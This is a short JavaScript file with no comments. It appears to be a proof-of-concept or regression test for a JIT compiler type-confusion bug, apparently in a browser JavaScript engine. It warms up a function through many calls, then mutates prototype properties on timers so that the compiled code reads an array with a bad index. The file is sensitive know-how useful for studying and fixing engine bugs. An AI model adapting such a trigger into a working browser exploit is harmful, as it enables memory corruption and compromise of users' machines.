function opt(container, objectOfS2, accessArray, transition) {
    container.someRandomPropertyToEmitCheckStructure;
    (typeof container).replace('a', 'b');

    let object = Object.getPrototypeOf(container);
    if (objectOfS2) {
        object = objectOfS2;

        0[0];
    }

    
    object.x;

    
    const array = ['a'];

    let result;
    for (let i = 0; i < 2; i++) {
        if (!objectOfS2 && accessArray) {
            
            
            const index = object[object.x];

            if (accessArray) {
                
                result = array[index][0];
            }
        }

        transition.z = 1;
    }

    return result;
}

function createObjectOfS1() {
    const object = {x: 'toJSON', toJSON: 0};

    Object.create(object);

    return object;
}


function createObjectOfS2() {
    const object = createObjectOfS1();
    object.y = 1;

    return object;
}

function main() {
    const objectOfS1 = createObjectOfS1();
    const objectOfS2 = createObjectOfS2();
    const container = Object.create(objectOfS1);

    for (let i = 0; i < 1000; i++) {
        opt(container, null, false, {});
        opt(container, objectOfS2, false, {});
    }

    for (let i = 0; i < 30000; i++) {
        opt(container, null, i < 1, {});
    }

    setTimeout(() => {
        JSON.stringify(container);

        setTimeout(() => {
            objectOfS1.y = 1;

            setTimeout(() => {
                objectOfS1.toJSON = 1;

                opt(container, null, false, {});
                opt(container, null, false, {});
            }, 2000);
        }, 1000);
    }, 500);
}

main();
